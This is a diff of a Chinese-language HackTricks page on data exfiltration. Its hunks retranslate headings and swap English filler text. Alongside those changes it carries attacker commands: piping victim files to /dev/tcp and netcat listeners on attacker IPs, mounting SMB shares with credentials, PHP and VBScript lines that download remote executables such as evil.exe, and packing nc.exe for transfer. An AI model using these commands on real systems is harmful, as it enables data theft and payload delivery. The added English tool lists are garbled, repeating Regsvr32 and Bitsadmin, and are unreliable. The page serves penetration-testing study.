@@ -1,8 +1,8 @@
-# 数据外泄
+# 数据泄露
 
 <details>
 
-<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
+<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
 
 支持HackTricks的其他方式：
 
@@ -16,15 +16,15 @@
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
 ***
 
-## 常见的白名单域用于外泄信息
+## 常见的白名单域名用于信息泄露
 
-查看[https://lots-project.com/](https://lots-project.com/)以找到常见的可被滥用的白名单域
+查看[https://lots-project.com/](https://lots-project.com/)以找到常见的可被滥用的白名单域名
 
 ## 复制\&粘贴Base64
 
@@ -127,7 +127,7 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTP 服务器（NodeJS）
+### FTP服务器（NodeJS）
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
@@ -191,42 +191,71 @@ Windows
 
 ## Exfiltration
 
-### Introduction
-
-Exfiltration is the unauthorized transfer of data from a target system. This section covers various methods to exfiltrate data from a compromised Windows system.
-
 ### Techniques
 
-1. **Compression**: Compress data before exfiltration to reduce size and avoid detection.
-2. **Encryption**: Encrypt data to prevent unauthorized access during exfiltration.
-3. **Steganography**: Hide data within other files to avoid detection.
-4. **DNS Tunneling**: Use DNS requests to exfiltrate data covertly.
-5. **HTTP/S Traffic**: Use HTTP/S protocols to exfiltrate data.
-6. **Email**: Send data as email attachments or within the email body.
-7. **Cloud Storage**: Upload data to cloud storage services for exfiltration.
-8. **External Storage**: Use external storage devices to physically exfiltrate data.
-9. **Printers**: Print sensitive data and collect it from a compromised printer.
-10. **Clipboard**: Copy data to the clipboard for exfiltration.
+1. **Exfiltration Over C2 Channel**: Utilize the existing command and control channel to exfiltrate data.
+
+2. **Exfiltration Over Alternative Protocol**: Use alternative protocols such as DNS, ICMP, or HTTP to exfiltrate data.
+
+3. **Exfiltration Over Unencrypted Protocols**: Leverage unencrypted protocols like FTP, Telnet, or HTTP to exfiltrate data.
+
+4. **Exfiltration Over Encrypted Protocols**: Utilize encrypted protocols like HTTPS or SSH to exfiltrate data.
+
+5. **Exfiltration Over Ingress Filtering**: Bypass egress filtering by exfiltrating data over allowed ingress channels.
 
 ### Tools
 
-- **Certutil**: Built-in Windows utility to decode/encode data.
-- **Bitsadmin**: Built-in tool to create and monitor BITS jobs.
-- **PowerShell**: Use PowerShell scripts for various exfiltration methods.
-- **FTP**: File Transfer Protocol for transferring files.
-- **Netcat**: Tool for network debugging and data transfer.
-- **Curl**: Command-line tool for transferring data with URLs.
-- **Wget**: Retrieve content from web servers.
-- **Cloud Service APIs**: Utilize cloud service APIs for data exfiltration.
+- **Netcat**: A versatile networking utility for reading from and writing to network connections.
 
-### Detection
+- **PowerShell**: A task automation framework for configuring systems and automating tasks.
 
-- Monitor network traffic for unusual patterns.
-- Implement Data Loss Prevention (DLP) solutions.
-- Use Endpoint Detection and Response (EDR) tools.
-- Analyze DNS requests for suspicious activities.
-- Monitor outbound network connections.
-- Conduct regular security audits and penetration testing.
+- **Certutil**: Command-line utility for managing certificates.
+
+- **Bitsadmin**: A tool to create and manage transfer jobs using Background Intelligent Transfer Service (BITS).
+
+- **FTP**: File Transfer Protocol for transferring files between a client and server on a network.
+
+- **Wget**: A command-line utility for downloading files from the web.
+
+- **Curl**: A tool for transferring data with URLs.
+
+- **SMBClient**: A tool for accessing shared folders.
+
+- **RDP**: Remote Desktop Protocol for remote access to Windows systems.
+
+- **WMIC**: Command-line tool for Windows Management Instrumentation.
+
+- **Reg**: Command-line utility for working with the registry.
+
+- **Schtasks**: Command-line tool for managing scheduled tasks.
+
+- **Bitsadmin**: Command-line tool for managing Background Intelligent Transfer Service (BITS) jobs.
+
+- **Vssadmin**: Command-line tool for managing Volume Shadow Copy Service.
+
+- **Wevtutil**: Command-line tool for managing event logs.
+
+- **Forfiles**: Command-line tool for batch processing files.
+
+- **Robocopy**: Command-line tool for copying files and directories.
+
+- **Diskshadow**: Command-line tool for managing shadow copies.
+
+- **Net**: Command-line tool for managing network resources.
+
+- **Tasklist**: Command-line tool for listing running processes.
+
+- **Taskkill**: Command-line tool for terminating processes.
+
+- **Regsvr32**: Command-line tool for registering and unregistering DLLs.
+
+- **Regini**: Command-line tool for modifying registry permissions.
+
+- **Regsvcs**: Command-line tool for registering and unregistering .NET components.
+
+- **Regsvr32**: Command-line tool for registering and unregistering DLLs.
+
+- **Regsvr32**: Command-line tool for registering and unregistering DLLs.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -248,7 +277,7 @@ sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
-## 网络通道
+## 网络通信
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -260,7 +289,7 @@ nc -vn <IP> 4444 < exfil_file
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### 将文件上传至受害者
+### 上传文件至受害者
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -289,7 +318,7 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-如果您可以将数据发送到一个SMTP服务器，您可以使用Python创建一个SMTP来接收数据：
+如果您可以将数据发送到SMTP服务器，您可以使用Python创建一个SMTP来接收数据：
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
@@ -321,31 +350,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```
 ## VBScript
 
-### VBScript Exfiltration Techniques
-
-VBScript can be used to exfiltrate data from a compromised system. Below are some common techniques used for data exfiltration using VBScript:
-
-1. **HTTP Requests**: VBScript can be used to send HTTP requests to an external server controlled by the attacker. Data can be encoded and sent as part of the request.
-
-2. **Email**: VBScript can be used to send emails with attachments containing exfiltrated data. This can be achieved by interacting with the local email client or using SMTP protocols.
-
-3. **DNS Tunneling**: VBScript can be used to encode data and send it over DNS requests to a controlled server. This technique can be used to bypass network restrictions.
-
-4. **File Transfer**: VBScript can be used to read files from the compromised system and transfer them to an external server using protocols like FTP or SMB.
-
-5. **Data Encoding**: VBScript can encode exfiltrated data using techniques like Base64 encoding before sending it out to evade detection.
-
-### Detection and Prevention
-
-To detect and prevent data exfiltration using VBScript, consider the following measures:
-
-- Monitor network traffic for suspicious HTTP requests originating from VBScript.
-- Implement email filtering to detect and block emails sent from VBScript.
-- Monitor DNS traffic for unusual patterns that may indicate data exfiltration using DNS tunneling.
-- Restrict VBScript execution on endpoints to prevent unauthorized exfiltration activities.
-- Implement endpoint security solutions to detect and block malicious VBScript activities.
-
-By understanding these exfiltration techniques and implementing detection and prevention measures, organizations can better protect their systems and data from unauthorized data exfiltration using VBScript.
+Visual Basic Script (VBScript) 是一种基于对象的脚本语言，通常用于 Windows 环境中。VBScript 可以通过多种方式进行数据泄露，包括通过网络传输数据，将数据写入文件，或者通过电子邮件发送数据。
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -383,7 +388,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe`程序不仅允许检查二进制文件，还具有**从十六进制重建它们的能力**。这意味着通过提供一个二进制文件的十六进制表示，`debug.exe`可以生成该二进制文件。然而，需要注意的是debug.exe有一个**组装文件大小限制为64 kb**。
+`debug.exe`程序不仅允许检查二进制文件，还具有**从十六进制重建它们的能力**。这意味着通过提供一个二进制文件的十六进制表示，`debug.exe`可以生成该二进制文件。然而，重要的是要注意`debug.exe`有一个**组装文件大小限制为64 kb**。
 ```bash
 # Reduce the size
 upx -9 nc.exe
@@ -395,20 +400,20 @@ wine exe2bat.exe nc.exe nc.txt
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
 <details>
 
-<summary><strong>从零开始学习AWS黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 支持HackTricks的其他方式：
 
-* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
 * 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
 * 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上关注我们 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。
 
 </details>
